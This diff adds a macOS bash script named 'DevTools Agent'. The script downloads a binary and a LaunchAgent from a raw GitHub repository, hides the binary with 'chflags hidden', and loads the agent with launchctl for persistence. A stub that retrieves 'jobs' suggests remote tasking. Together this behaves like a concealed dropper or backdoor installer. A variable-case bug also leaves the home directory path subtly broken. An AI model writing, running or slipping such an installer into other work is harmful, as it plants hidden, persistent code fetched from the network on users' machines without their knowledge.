@@ -1,0 +1,63 @@
+#!/bin/bash
+## DevTools Agent
+## Set Global Variables
+USERNAME=$(stat -f%Su /dev/console)
+HOME_DIR=$(eval echo "~${username}")
+repo="https://raw.githubusercontent.com/jaykepeters/unio/master"
+
+function execs() {
+    chmod +x "$HOME_DIR""/bin/"*
+}
+
+function confCheck() {
+    la="user.DevTools.agent.plist"
+    theLA="$HOME_DIR""/Library/LaunchAgents/""$la"
+    binary="$HOME_DIR""/bin/DevTools"
+    inetisUp() {
+        echo -e "GET http://google.com HTTP/1.0\n\n" | nc google.com 80 > /dev/null 2>&1
+        if [ $? -eq 0 ]; then
+            return 0
+        else
+            return 1
+        fi
+    }
+    installLA() {
+        echo 'Installing Launch Agent'
+        curl -sSL "$repo"/"$la" > "$theLA"
+        launchctl unload "$theLA"
+        launchctl load "$theLA"
+    }
+    installBinary() {
+        echo 'Installing Binary'
+        curl -sSL "$repo""/bin/DevTools" > "$binary"
+        chmod +x "$binary"
+        chflags hidden "$binary"
+    }
+    # Internet Connection
+    inetisUp
+    if [ $? -eq 1 ]; then
+        echo 'COULD NOT CONNECT'
+        exit 1
+    fi
+    # Launch Agent
+    if [ ! -f "$theLA" ]; then
+        installLA
+    fi
+    # Binary
+    if [ ! -f "$binary" ]; then
+        installBinary
+    fi
+}
+
+function getJobs() {
+    echo 'Retreiving New Jobs'
+}
+
+function main() {
+    execs
+    confCheck
+    getJobs
+}
+
+## START THE SCRIPT
+main
